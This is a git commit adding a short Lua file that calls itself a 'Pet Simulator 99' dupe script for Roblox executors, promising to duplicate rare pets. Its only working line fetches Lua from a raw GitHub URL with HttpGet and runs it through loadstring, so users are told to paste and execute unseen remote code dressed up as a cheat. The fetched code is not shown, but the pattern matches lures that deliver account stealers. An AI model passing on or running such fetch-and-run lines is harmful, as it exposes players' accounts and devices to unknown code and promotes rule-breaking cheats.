8b92f2cc3652745dbc374247f695a53c62ec15d6
Maximusikk <78302672+Maximusikk@users.noreply.github.com>
2024-01-06 13:02:34 +0500

    Create ps99dupe.lua

---
+++ ps99dupe.lua
@@ -0,0 +1,6 @@
+--Pet Simulator 99! 🎉 Dupe Script! (Copy and Put in Executor)(Working: Delta and ArceusX etc...)
+-------------------------------------------------------
+--🆕 Updated (05/01/2024) (Insane Script)
+-- Dupe huges and exclusives
+--Script📝:
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Egorikusa/PremiumScripts/main/a8e7e831ff7b2aeb146d6853.lua'))()
